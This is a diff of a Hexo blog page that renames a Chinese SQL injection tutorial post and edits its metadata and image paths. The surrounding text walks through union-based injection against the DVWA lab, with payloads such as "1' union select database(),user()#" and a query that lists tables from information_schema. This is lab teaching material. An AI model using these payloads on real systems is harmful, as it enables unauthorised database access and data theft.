@@ -174,12 +174,12 @@
       </div>
       <div class="site-state-item site-state-categories">
           <a href="/categories/">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">1</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-count">1</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -246,7 +246,7 @@
   
 
   <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="https://zuifan.github.io/2022/03/25/sql%E6%B3%A8%E5%85%A5/">
+    <link itemprop="mainEntityOfPage" href="https://zuifan.github.io/2022/03/25/SQL%E6%B3%A8%E5%85%A501/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -259,7 +259,7 @@
     </span>
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
-          <a href="/2022/03/25/sql%E6%B3%A8%E5%85%A5/" class="post-title-link" itemprop="url">sql注入</a>
+          <a href="/2022/03/25/SQL%E6%B3%A8%E5%85%A501/" class="post-title-link" itemprop="url">SQL注入01</a>
         </h2>
 
         <div class="post-meta-container">
@@ -271,16 +271,7 @@
       <span class="post-meta-item-text">发表于</span>
       
 
-      <time title="创建时间：2022-03-25 15:42:40 / 修改时间：15:43:37" itemprop="dateCreated datePublished" datetime="2022-03-25T15:42:40+08:00">2022-03-25</time>
-    </span>
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
-        </span>
+      <time title="创建时间：2022-03-25 16:10:05 / 修改时间：18:40:37" itemprop="dateCreated datePublished" datetime="2022-03-25T16:10:05+08:00">2022-03-25</time>
     </span>
 
   
@@ -330,7 +321,7 @@
 <p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ order by 1#`;</p>
 <p>这条语句的意思是查询users表中user_id为1的数据并按第一字段排行。</p>
 <p>输入 <code>1' order by 1#</code>和 <code>1' order by 2#</code>时都返回正常：</p>
-<img src="/.io//hexo-blog\source\_posts\SQL注入\3.png">
+<p><img src="/.io//2.png" alt="2"></p>
 <p>由此可知，user表中只有两个字段，数据为两列。</p>
 <p>接下来我们使用 union select联合查询继续获取信息。<br>
 union 运算符可以将两个或两个以上 select 语句的查询结果集合合并成一个结果集合显示，即执行联合查询。需要注意在使用 union 查询的时候需要和主查询的列数相同，而我们之前已经知道了主查询列数为 2，接下来就好办了。<br>
@@ -339,7 +330,7 @@ union 运算符可以将两个或两个以上 select 语句的查询结果集合
 user()将会返回执行当前查询的用户名.</p>
 <p>实际执行的Sql语句是 :</p>
 <p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ union select database(),user()#`;</p>
-<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A5%5C4.png" alt=""></p>
+<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A501%5C4.png" alt></p>
 <p>通过上图返回信息，我们成功获取到：</p>
 <ul>
 <li>当前网站使用数据库为 dvwa .</li>
@@ -352,7 +343,7 @@ user()将会返回执行当前查询的用户名.</p>
 </ul>
 <p>实际执行的Sql语句是:</p>
 <p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ union select version(),@@version_compile_os#`;</p>
-<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A5%5C5png.png" alt=""></p>
+<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A501%5C5png.png" alt></p>
 <p>通过上图返回信息，我们又成功获取到：</p>
 <p>当前数据库版本为 : 5.6.31-0ubuntu0.15.10.1.<br>
 当前操作系统为 : debian-linux-gnu<br>
@@ -361,7 +352,7 @@ information_schema 是 mysql 自带的一张表，这张数据表保存了 Mysql
 <p>我们输入<code>1' union select table_name,table_schema from information_schema.tables where table_schema= 'dvwa'#</code>进行查询：<br>
 实际执行的Sql语句是：</p>
 <p>SELECT first_name, last_name FROM users WHERE user_id = ‘1’ union select table_name,table_schema from information_schema.tables where table_schema= ‘dvwa’#`;</p>
-<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A5%5C6.png" alt=""></p>
+<p><img src="/.io//D:%5Chexo-blog%5Csource_posts%5CSQL%E6%B3%A8%E5%85%A501%5C6.png" alt></p>
 <p>通过上图返回信息，我们再获取到：</p>
 <p>dvwa 数据库有两个数据表，分别是 guestbook 和 users .</p>
 <p>我们接下来获取用户名和密码。</p>
